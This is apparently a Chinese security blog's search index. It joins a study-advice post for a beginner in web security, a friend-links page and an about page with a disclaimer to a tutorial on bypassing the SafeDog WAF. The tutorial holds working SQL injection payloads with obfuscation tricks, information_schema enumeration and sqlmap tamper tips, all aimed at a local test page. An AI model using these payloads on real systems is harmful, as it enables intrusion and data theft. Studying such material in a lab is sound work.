","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:6:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#一些进阶的书籍和资源推荐"},{"categories":["学习"],"content":" 0x02 聊聊“学习”与“实践”","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:0:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#0x02-聊聊学习与实践"},{"categories":["学习"],"content":" 入门与进阶对于初学者来说，找一个靠谱的教程或者老师，帮助自己快速入门是非常有必要的。入门之后，虽然高手的点拨也很重要，但更多的功课其实是需要你自己来做的。这也是为什么优秀的入门教程很多，但是优质的进阶版本教程却不多。 有一句话叫“付费就是占便宜”，对于新手来说，入门阶段花一点钱买一套优质的课程，让有经验的内行带着自己学习，往往是最优的选择。还有一句话叫“免费的就是最贵的”，免费的教学资源，质量参差不齐难以保证，不用花钱，但耗费的是你筛选的精力和时间。自己根据条件取舍，现在已经逐渐进入了一种知识付费的时代，这就是我给表弟买了一套云课堂的《Web安全工程师微专业》课程作为入门学习的原因，一套优质的网课，相比于昂贵的线下班性价比很不错。 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:1:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#入门与进阶"},{"categories":["学习"],"content":" 等准备好了再“实践”？李笑来老师有一个观点，学习任何一个学科的时候，都有一个概念很重要： 最少必要知识 MAKE : Minimal Actionable Knowledge and Experience 就是说，当我们在学习某项技能的时候，就要用最快的时间摸索清楚最少必要知识 （MAKE） 都有哪些？ 然后迅速地掌握它们，这样就实现了“快速入门”，然后就可以开始动手实践，然后在实践中印证理论、加深理解，同时继续扩展学习。 同样的时间，一个用来等待，另一个用来践行，两者的差距可能是天壤之别。你要知道没有任何考试是在你准备充分了才开始的。 有些人喜欢等待，等到合适的时机出现的时候，再采取行动。另一些人则喜欢边做边想，有不足的地方就改进，有新的问题就解决。 一段时间过去之后，后者可能已经前进了很长一段路程，而前者多半还在等待一个“恰当的时机”。 我原来就有这个问题，老想着先体系化学完某门技术…结果就是坚持不实践，过了很久还是啥都不会，反而之前看的那些知识因为没实践过也都忘了。 用和学，用比学重要。用时比学时重要。“用时”是一个很好的概念。 很多人说自己“学”了那么多年英语，但现在依然说不出，听不懂。其实他们就是在用“学时”代替“用时”来计算自己的付出的。 我们总说有效学习，其实衡量有效学习最好的方式就是：计算使用的时间。在安全技术学习上，就是：实践的时间。 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:2:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#等准备好了再实践"},{"categories":["学习"],"content":" 从“想到”、“学到” 到 “做到”“用”比“学”重要；“做”比“想”重要；边做边想，比单纯想想不知道好多少倍。只有做到了才是掌握了。“人至‘践’则无敌”。 只要你开始做，高估或低估的困难就不仅仅是一个估计，而是一个摆在面前需要解决的现实问题。你对于它的理解不会再飘忽不定，而会变得非常具体。 很多人在做得不好的时候，总是喜欢退缩回原来的舒适区，认为是由于自己的基础还不好所以才这么不顺利，而忘记了这些践行过程中的困难，才是真正帮他们打牢基础的过程。 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:3:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#从想到学到-到-做到"},{"categories":["学习"],"content":" 0x03 结语很多人梦想找到一个牛逼的师父，几天速成然后笑傲江湖。可是每一个真正练就一身武艺的人都是靠冬练三九夏练三伏这么过来的，他们靠着一种忘我的热情持续投入进去磨练，数年如一日，最终自己也不知道怎么就发现具备了无坚不摧的实力。 同样，就算是要开好挖掘机，或着当一个好厨师，也要在自己的技能树上，一步一步地积累技能点，把过路点都点满了，才能点出大招。 我们从小到大往往会听到长辈们的建议：“戒骄戒躁”。虽然“戒骄”放在前面，但“戒骄”其实是有了一定成绩之后的事情。对大多数人来说，首先要“戒躁”，才有机会“戒骄”。 一个人能获得的最可贵的能力，都和掌握一门语言一样，你所付出的努力不是能够获得即时回馈的，甚至在很长的一段时间内没有任何收获，直到积累到了一定的阶段后，忽然爆发出惊人的力量，连你自己都不清楚这一切是如何发生的。比如锻炼身体，读书写作。当你经历了足够的量变终于引起质变时拥有的技能，大部分人是终身难以企及的，不是因为他们太笨，恰恰相反，因为他们都太聪明了。选择一个正确的方向，对那些无法立即获得回报的事情，依然能付出十年如一日的专注和热情，最终的结果也许不足以让你独孤求败，但足以出类拔萃。 祝表弟早日成为表哥，然后带带我~ ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:0:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#0x03-结语"},{"categories":["学习"],"content":" 本文相关链接资源整理： 《白帽子讲Web安全》 《Web前端黑客技术揭秘》 《HTTP权威指南》 《黑客攻防技术宝典 Web实战篇》 《黑客秘笈 渗透测试实用指南》 《Python核心编程》 《PHP和MySQL Web开发》 《Head First HTML与CSS》 《JavaScript高级程序设计》 W3C 菜鸟教程runoob 现代魔法学院 网站构建初级教程_W3C； HTTP协议基础-runoob； phpStudy ； WAMP； Freebuf； Web安全-i春秋； DVWA； DVWA系列教程_Freebuf； 教育行业SRC； 自律方能自由，《网络安全法》实施后的白帽子行为参考； 网站安全_i春秋社区； 全国大学生信息安全竞赛； 全国大学生信息安全竞赛创新实践能力线上赛（CTF形式）； oschina； 博客园； 简书； 安全圈info； SecWiki； 《Web安全工程师微专业》 《Web安全工程师微专业》进阶版 ","date":"2021-01-13","objectID":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/:1:0","series":null,"tags":["技能"],"title":"给表弟的Web安全入门建议","uri":"/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/#本文相关链接资源整理"},{"categories":["技术"],"content":" 攻击的特定:攻击二象性:已知攻击和未知攻击 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#攻击的特定"},{"categories":["技术"],"content":" 目前市面主流的WAF产品:","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#目前市面主流的waf产品"},{"categories":["技术"],"content":" 云WAF 阿里云盾 腾讯网站管家 创宇盾 ClodeFlare等 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:1:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#云waf"},{"categories":["技术"],"content":" 软件产品类 安全狗 云锁 360主机卫士 ModSecurity ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:2:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#软件产品类"},{"categories":["技术"],"content":" 硬件类型设备: 启明星辰 绿盟 天融信 飞塔等 硬件waf缺陷:对HTTP协议的兼容性不强,对异常报文会产生bug,导致绕过 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:3:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#硬件类型设备"},{"categories":["技术"],"content":" WAF的核心原理: 运用黑白思想 特征匹配,漏洞签名:特定特征的漏洞,比如stract2漏洞 对匹配结果进行响应(拦截,记录) ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#waf的核心原理"},{"categories":["技术"],"content":" WAF的几种部署模式:","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#waf的几种部署模式"},{"categories":["技术"],"content":" 基于DNS解析修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:1:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#基于dns解析"},{"categories":["技术"],"content":" 串联模式一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署. ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:2:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#串联模式"},{"categories":["技术"],"content":" 旁路模式利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断. ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:3:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#旁路模式"},{"categories":["技术"],"content":" 软件嵌入中间件+检测引擎模式在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:4:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#软件嵌入中间件检测引擎模式"},{"categories":["技术"],"content":" WAF为什么会被绕过: 鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作 WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性 硬件WAF自身往往存在漏洞 架构:waf部署模式 规则缺陷/特性 协议:指HTTP0.9协议:TCP长连接 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#waf为什么会被绕过"},{"categories":["技术"],"content":" WAF绕过实战—-绕过安全狗进行注入所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:0:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#waf绕过实战-绕过安全狗进行注入"},{"categories":["技术"],"content":" 实验环境:环境:安全狗Apache最新版 本地测试代码(PHP): $id = $_GET['id']; $con = mysql_connect(\"localhost\",\"root\",\"root\"); if (!$con){die('Could not connect: ' . mysql_error());} mysql_select_db(\"dvwa\", $con); $query = \"SELECT first_name,last_name FROM users WHERE user_id = '$id'; \"; $result = mysql_query($query)or die('\u003cpre\u003e'.mysql_error().'\u003c/pre\u003e'); while($row = mysql_fetch_array($result)) { echo $row['0'] . \"\u0026nbsp\" . $row['1']; echo \"\u003cbr /\u003e\";}echo \"\u003cbr/\u003e\";echo $query; mysql_close($con); ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:1:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#实验环境"},{"categories":["技术"],"content":" 绕过拦截and 1=1首先先稍微测试一番,发现存在安全狗 http://127.0.0.1/test.php?id=1 and 1=1%23 and 1 拦截 and '1' 拦截 and a 不拦截 and 'a' 拦截 and ! 不拦截 and 1+1 拦截 and 1+a 拦截 and hex(1) 不拦截 通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路 用其他字符替换 and 或者 or 带入的不是字符串和数字型，带入一个特殊符号 针对第一种我们可以去看看运算符号 随便找到几个| ^ xor \u0026 / * \u0026\u0026 || 等等还有很多 与运算 a \u0026 b , 或运算 a | b , 异或运算 a ^ b 那么可以试着将and替换成\u0026\u0026,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过 http://127.0.0.1/test.php?id=1' %26%26 true%23 另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持\u0026\u0026 || ,oracle不支持 \u0026\u0026 ||） http://127.0.0.1/test.php?id=1' || true%23 //将and 1=1替换为|| true,也可以绕过安全狗 http://127.0.0.1/test.php?id=1' ||(1) %23 //使用括号代替空格绕过 //异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1） http://127.0.0.1/test.php?id=1' xor 1%23 http://127.0.0.1/test.php?id=1' xor true%23 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:2:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#绕过拦截and-11"},{"categories":["技术"],"content":" 绕过order by查询判断查询字段,使用mysql的/*!*/内敛注释去绕过防护,而其中的代码是可以正常执行的 http://127.0.0.1/test.php?id=1' /*!order*//*!by*/2%23 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:3:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#绕过order-by查询"},{"categories":["技术"],"content":" 绕过union select查询使用union xxx页面正常 但是用union和select放在在一起就被发现啦 在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过 http://127.0.0.1/test.php?id=1'=/*!user () regexp 0x5e72*/--+ 对于数字型注入,可以将其转换成浮点型 联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过, 函数中可以插入任何混淆字符绕过waf 另外使用-1可以省去空格绕过waf http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23 基于报错信息的注入绕安全狗 http://127.0.0.1/test.php?id=1' and /*!12345updatexml!*/(1,concat(0x7e,version()))%23 http://127.0.0.1/test.php?id=1' and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:4:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#绕过union-select查询"},{"categories":["技术"],"content":" 绕过select from使用大括号去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables} 使用反引号去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables` 使用\\N去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\\Nfrom information_schema.tables 括号法去绕过 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables))) 也可以组合起来 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4\\Nfrom{a`information_schema`.tables} 这些都是去掉空格的合法语句,当然如果不拦截/*/或/!*/的话,也可以尝试这两个 提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。 补充点 php+mysql环境下支持的空格有： %0a,%0b,%0c,%0d,%20,%09,%a0,/**/ 其中使用的最多的就是%0a,%0b,%a0,/**/，这四个当作空格插入在语句中来扰乱waf检测。 干货分享：使用/^!$asd%2a–=/代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的/*/换成/^!$asd%2a–=*/即可使用sqlmap跑了。 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:5:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#绕过select-from"},{"categories":["技术"],"content":" 缓冲区溢出绕waf另外也可以对安全狗实行缓冲区溢出绕waf 缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过 要求是(针对于安全狗而已): GET类型请求转换成POST类型 Content-Length头长度大于4008 正常参数放置在脏数据后面 ","date":"2020-12-15","objectID":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/:6:0","series":null,"tags":["waf"],"title":"绕waf系列之绕安全狗","uri":"/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/#缓冲区溢出绕waf"},{"categories":null,"content":" 缥缈博客 缥缈个人博客 远海的博客 远海的博客 独自等待博客 关注信息安全 国光 逆水行舟，不进则退。 本站优先招原创内容的博客或网站，站点主题内容是互联网、技术、生活分享类博客优先。 未受到搜索引擎惩罚，百度或谷歌正常收录 PR\u003e=0。 站点时间不超过 3 个月，文章数量不超过 10 篇，且长期不更新，申请链接不予受理! 要求贵站页面设计整洁，内容健康，符合中国法律法规。 不接受广告联盟、营销网站之类站点的链接，且无恶意代码。 会不定期回访并清除部分不符合要求的友链。 注：请按照下方格式留言，麻烦站长们先在自己的站点添加上本站友链，我会尽快添加你的友链并通知你。 网站名称：bysec 网站链接：https://www.bysec.cn/ 网站头像：https://q.qlogo.cn/headimg_dl?dst_uin=1726946232\u0026spec=100 网站描述：bysec信息安全个人博客 ","date":"2020-05-20","objectID":"/link/:0:0","series":null,"tags":null,"title":"友链","uri":"/link/#"},{"categories":null,"content":" 关于网站 个人博客，欢迎交流。 邮箱: bysec@qq.com ","date":"2020-05-20","objectID":"/about/:1:0","series":null,"tags":null,"title":"关于","uri":"/about/#关于网站"},{"categories":null,"content":" 关于网站 个人博客，欢迎交流。 邮箱: bysec@qq.com ","date":"2020-05-20","objectID":"/about/:1:0","series":null,"tags":null,"title":"关于","uri":"/about/#个人博客欢迎交流"},{"categories":null,"content":" 关于作者 💻 技术宅，热爱关于计算机的一切 😱 强迫症与拖延症患者 🤔 热衷于了解世界的运转机制 ❤️ 爱好动漫、音乐、游戏 ","date":"2020-05-20","objectID":"/about/:2:0","series":null,"tags":null,"title":"关于","uri":"/about/#关于作者"},{"categories":null,"content":" 关于版权本站所有的原创文章均受 创作共享 署名-非商业性 4.0 许可协议 / CC BY-NC 4.0 保护。 ","date":"2020-05-20","objectID":"/about/:3:0","series":null,"tags":null,"title":"关于","uri":"/about/#关于版权"},{"categories":null,"content":" 用户条款 警告 《中华人民共和国网络安全法》是为保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展而制定的法律。 警告 《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，自2017年6月1日起施行 禁止 本站提供的一切软件、教程和内容信息仅限用于学习和研究目的；不得将上述内容用于商业或者非法用途，否则，一切后果请用户自负。 ","date":"2020-05-20","objectID":"/about/:4:0","series":null,"tags":null,"title":"关于","uri":"/about/#用户条款"}]